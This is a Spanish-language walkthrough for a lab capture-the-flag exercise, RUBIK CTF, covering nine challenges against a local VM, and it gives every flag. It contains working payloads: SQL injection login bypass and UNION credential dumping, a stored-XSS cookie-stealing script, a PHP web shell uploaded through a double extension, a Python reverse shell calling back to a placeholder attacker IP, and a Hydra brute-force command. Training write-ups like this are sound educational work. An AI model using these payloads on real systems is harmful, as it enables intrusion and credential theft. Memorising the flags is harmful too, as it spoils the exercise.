# RUBIK CTF — Guía de resolución paso a paso

Esta guía explica **cómo llegar** a cada solución: primero reconocer, luego
detectar la vulnerabilidad, confirmarla y por último explotarla. No es un listado
de payloads: cada paso indica **qué observar** antes de continuar.

Convenciones:

- IP base de la VM: `192.168.56.77` (cámbiala por la tuya).
- Para los retos de red, Kali debe estar en la red `192.168.56.0/24` (host-only)
  o la VM en modo puente.
- Las flags se envían **en la plataforma** (`http://192.168.56.77/retos/<slug>`).
- Todas las flags tienen el formato `RUBIK{...}`.

---

## 1) Acceso al panel — Nexora (Web · SQL Injection)

**Servicio:** `http://192.168.56.77:8001`

### 1. Reconocimiento
Abre la URL. Es un login de intranet con dos campos: **Usuario** y **Contraseña**.
Prueba credenciales normales (`admin` / `admin`): verás *"Usuario o contraseña
incorrectos"*. No hay más pistas a simple vista.

### 2. Detectar si es inyectable
Escribe una **comilla simple** en el usuario y cualquier contraseña:

```
usuario: '
```

Si la página muestra un **error SQL** (del tipo `unrecognized token` o
`unterminated string`), significa que tu entrada se está **concatenando** en la
consulta. Ese error confirma la inyección.

### 3. Confirmar el bypass
Una consulta típica es `... WHERE usuario='X' AND contrasena='Y'`. Si cierras la
comilla y comentas el resto, la contraseña deja de comprobarse. Prueba:

```
usuario: ' OR '1'='1' -- 
contraseña: x
```

Si entras como el primer usuario, ya has confirmado el bypass.

### 4. Explotar
Para entrar directamente como administrador, comenta todo lo que sigue al usuario:

```
usuario: admin' -- 
contraseña: x
```

El `-- ` (guion guion + espacio) comenta el `AND contrasena=...`.

### 5. Obtener la flag
El panel privado muestra la flag:

```
RUBIK{sql_injection_101}
```

---

## 2) Banco central — Banco Aurora (Web · SQL Injection UNION)

**Servicio:** `http://192.168.56.77:8005`

### 1. Reconocimiento
Es el buscador de clientes de un banco. Busca `Ana` y observa: aparece una tabla
con **3 columnas** (ID, Nombre, Correo). Ese dato será clave para el `UNION`.

### 2. Detectar si es inyectable
Introduce una comilla simple (`'`) en la búsqueda. Si aparece un **error SQL**,
la entrada se concatena y es inyectable.

### 3. Averiguar el número de columnas
No puedes hacer un `UNION` con un número distinto de columnas. Prueba `ORDER BY`
e incrementa hasta que falle:

```
' ORDER BY 3 -- 
' ORDER BY 4 -- 
```

Con `3` funciona y con `4` da error → la consulta devuelve **3 columnas**.

### 4. Enumerar las tablas
La base de datos es **SQLite**, cuyo esquema está en `sqlite_master`. Coloca el
nombre de la tabla en la segunda columna (la que se muestra como "Nombre"):

```
' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' -- 
```

Verás tablas como `clientes` y `credenciales`. Ya sabes dónde buscar.

### 5. Ver las columnas
Pide el `CREATE TABLE` guardado en el esquema:

```
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name='credenciales' -- 
```

Devuelve algo como
`CREATE TABLE credenciales (id INTEGER PRIMARY KEY, usuario TEXT, password_b64 TEXT)`.
Ya conoces las columnas `usuario` y `password_b64`.

### 6. Volcar las credenciales
```
' UNION SELECT 1, usuario, password_b64 FROM credenciales -- 
```

Localiza `luis.miguel` y **decodifica su Base64**:

```bash
echo -n '<password_b64_de_luis>' | base64 -d
```

### 7. Obtener la flag
La contraseña decodificada es:

```
RUBIK{sqli_banco_luis_miguel}
```

---

## 3) XSS almacenado — Nébula (Web · XSS)

**Servicio:** `http://192.168.56.77:8004`

> Ábrelo desde la plataforma (mismo navegador) para que se fije la cookie
> `rubik_usuario` y tu muro quede separado del de otros.

### 1. Reconocimiento
Es un "muro" donde publicas un comentario (nombre + texto). Fíjate en el aviso:
*"Un moderador revisa las publicaciones"*. Ese moderador es un **bot** que visita
el muro.

### 2. Detectar si el HTML se escapa
Publica un comentario con formato:

```
<b>hola</b>
```

Si aparece en **negrita** (y no como texto literal), el contenido se está
renderizando como HTML **sin escapar** → hay XSS almacenado.

### 3. Confirmar que se ejecuta JavaScript
Publica:

```html
<script>document.title='xss'</script>
```

Si el título de la pestaña cambia, el script se ejecuta. Pero ejecutarlo en **tu**
navegador no te da privilegios: la flag la tiene el **bot**.

### 4. Entender el objetivo
El bot admin lleva la flag en una cookie (`document.cookie`). La idea es que tu
script se ejecute en el navegador del bot y **le robe la cookie**, enviándola al
propio muro (mismo origen), para que puedas leerla.

### 5. Explotar
Publica un comentario con este payload (un `<script>` que hace un `POST` al muro
con la cookie del bot):

```html
<script>fetch('/comentario',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'autor=bot&texto='+encodeURIComponent(document.cookie)})</script>
```

### 6. Obtener la flag
Espera ~10-15 s (el bot revisa periódicamente) y recarga. Aparecerá un comentario
publicado por `bot` con su cookie. Dentro está:

```
RUBIK{stored_xss_101}
```

---

## 4) Receta manipulada — Clínica Vita (Web · File Upload)

**Servicio:** `http://192.168.56.77:8007`

### 1. Reconocimiento
Portal de recetas: subes una imagen/PDF y se guarda en `/uploads/`, mostrando un
enlace al archivo. El aviso dice que "los archivos ejecutables están bloqueados".

### 2. Detectar cómo valida
1. Sube una imagen normal: funciona.
2. Sube un archivo llamado `prueba.php` con contenido `<?php echo 'x'; ?>`:
   aparece un error porque la **última extensión** es `.php` (lista negra).

Es decir, solo mira lo que hay **después del último punto**.

### 3. Confirmar el bypass de doble extensión
Sube el mismo contenido con un nombre de **doble extensión**, por ejemplo
`prueba.php.jpg`. La última extensión es `.jpg`, así que **pasa la validación**.

Comprueba si se ejecuta: accede a `/uploads/prueba.php.jpg` y si imprime tu texto
(o ejecuta PHP), el servidor está mal configurado para ejecutar cualquier nombre
que contenga `.php`.

### 4. Convertirlo en webshell
Crea `receta.php.jpg` con:

```php
<?php system($_GET['c']); ?>
```

Súbelo (el formulario sirve, no hace falta falsear el MIME):

```bash
curl -F "paciente=Ana" -F "archivo=@receta.php.jpg" http://192.168.56.77:8007/
```

### 5. Ejecutar comandos y leer la flag
```bash
curl "http://192.168.56.77:8007/uploads/receta.php.jpg?c=id"
curl "http://192.168.56.77:8007/uploads/receta.php.jpg?c=cat%20/flag.txt"
```

### 6. Obtener la flag
```
RUBIK{file_upload_doble_extension}
```

---

## 5) Diagnóstico de red — AuroraVault (Web · RCE → reverse shell)

**Servicio:** `http://192.168.56.77:8006`

> El contenedor **no tiene bash ni netcat**: la vía prevista es Python + PTY.

### 1. Reconocimiento
Es una consola de "diagnóstico de red": introduces un host y responde si es
accesible. La salida **no se muestra** (inyección a ciegas).

### 2. Detectar si es inyectable
Prueba a "encadenar" un comando. Primero mide el tiempo de respuesta con un host
normal (`127.0.0.1`). Después introduce:

```
127.0.0.1; sleep 5
```

Si la respuesta tarda ~5 s, el `sleep` se ejecutó → **inyección de comandos**
confirmada.

### 3. Preparar el listener en Kali
```bash
nc -lvnp 4444 -k
```

### 4. Lanzar la reverse shell con Python + PTY
En el campo "host" (sustituye `IP_KALI` por la de tu Kali):

```
127.0.0.1; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP_KALI",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")' &
```

El `&` final hace que la petición no se quede colgada.

### 5. En la shell
```bash
id
cat /flag.txt
```

### 6. Obtener la flag
```
RUBIK{reverse_shell_vault}
```

---

## 6) Extranet de Nexora (Web · fuerza bruta con Hydra)

**Servicio:** `http://192.168.56.77:8009`

### 1. Reconocimiento
Login de extranet. En la página hay un enlace a un **comunicado** ("Incidente
Boreal") que explica que una filtración dejó una **lista de contraseñas** y que
la cuenta `admin` nunca se rotó.

### 2. Localizar la lista y el usuario
- La lista está en `http://192.168.56.77:8009/lista.txt`.
- El usuario objetivo es `admin`.

```bash
curl -s http://192.168.56.77:8009/lista.txt -o lista.txt
```

### 3. Detectar cómo se comporta el login
Prueba `admin` / `cualquiera`: la respuesta contiene `Credenciales incorrectas`.
Eso te permite distinguir intentos fallidos de uno correcto.

### 4. Fuerza bruta (evitando falsos positivos)
Si usas `F=incorrectas`, algunas respuestas vacías por concurrencia se cuentan
como éxito (falsos positivos). Mejor usa una **condición de éxito** con una
palabra que solo salga en el panel correcto (`Confidencial`) y baja la
concurrencia:

```bash
hydra -l admin -P lista.txt -s 8009 -f -t 4 192.168.56.77 \
  http-post-form "/login:usuario=^USER^&contrasena=^PASS^:S=Confidencial"
```

Resultado esperado: `password: sunshine`.

### 5. Entrar y leer la flag
Entra en `http://192.168.56.77:8009` con `admin` / `sunshine`; el panel muestra:

```
RUBIK{hydra_extranet}
```

---

## 7) Puerto inesperado (Redes · nmap)

**Objetivo:** el host `192.168.56.77`

### 1. Reconocimiento
El reto invita a **escanear** el host. Empieza por los puertos más comunes:

```bash
nmap 192.168.56.77
```

### 2. Escanear todos los puertos
Como el servicio está en un puerto no estándar, escanea el rango completo:

```bash
nmap -p- 192.168.56.77
```

Además de los puertos web conocidos, aparecerá uno raro (por ejemplo `31337`).

### 3. Identificar el servicio
```bash
nmap -sV -p 31337 192.168.56.77
```

### 4. Leer el banner
Conéctate al puerto y lee lo que envía:

```bash
nc 192.168.56.77 31337
```

El servicio devuelve un banner con la flag.

### 5. Obtener la flag
```
RUBIK{hidden_port}
```

---

## 8) Banner revelador (Redes · nmap -sV)

**Servicio:** `192.168.56.77:8003`

### 1. Reconocimiento
El reto indica que la **versión de un servicio** revela la flag. Empieza por
identificar qué corre en ese puerto.

### 2. Detección de versión
```bash
nmap -sV -p 8003 192.168.56.77
```

Fíjate en la información de versión/servidor que reporta nmap.

### 3. Alternativa directa (cabeceras)
```bash
curl -sI http://192.168.56.77:8003/
```

A veces la información viaja en la **cabecera `Server`**.

### 4. Obtener la flag
El banner/cabecera incluye:

```
RUBIK{service_banner}
```

---

## 9) Credenciales en el PCAP (Redes · Wireshark)

**Recurso:** `http://192.168.56.77/recursos/credenciales-pcap/captura.pcap`

### 1. Reconocimiento
Descarga la captura:

```bash
wget http://192.168.56.77/recursos/credenciales-pcap/captura.pcap
```

Ábrela con Wireshark.

### 2. Ver qué tráfico hay
Filtra por HTTP:

```
http
```

Verás una petición a `/admin`. Eso indica un login/panel.

### 3. Inspeccionar la petición
Selecciona la petición y usa *Follow → TCP Stream* (o mira las cabeceras HTTP).
Busca la cabecera `Authorization`.

### 4. Entender las credenciales
Verás algo como:

```
Authorization: Basic YWRtaW46UlVCSUt7cGNhY19iYXNpY19hdXRofQ==
```

El esquema **Basic** envía `usuario:contraseña` codificado en **Base64** (no
cifrado). Decodifícalo:

```bash
echo YWRtaW46UlVCSUt7cGNhY19iYXNpY19hdXRofQ== | base64 -d
# admin:RUBIK{pcap_basic_auth}
```

### 5. Obtener la flag
```
RUBIK{pcap_basic_auth}
```

---

## Tabla resumen

| # | Reto | Categoría | Técnica | Flag |
|---|---|---|---|---|
| 1 | Acceso al panel | Web | SQLi (bypass login) | `RUBIK{sql_injection_101}` |
| 2 | Banco central | Web | SQLi UNION + Base64 | `RUBIK{sqli_banco_luis_miguel}` |
| 3 | XSS almacenado | Web | Stored XSS + bot | `RUBIK{stored_xss_101}` |
| 4 | Receta manipulada | Web | File Upload (doble extensión) | `RUBIK{file_upload_doble_extension}` |
| 5 | Diagnóstico de red | Web | Command injection → PTY | `RUBIK{reverse_shell_vault}` |
| 6 | Extranet de Nexora | Web | Fuerza bruta (Hydra) | `RUBIK{hydra_extranet}` |
| 7 | Puerto inesperado | Redes | nmap `-p-` | `RUBIK{hidden_port}` |
| 8 | Banner revelador | Redes | nmap `-sV` / cabeceras | `RUBIK{service_banner}` |
| 9 | Credenciales en el PCAP | Redes | Wireshark + Basic auth | `RUBIK{pcap_basic_auth}` |
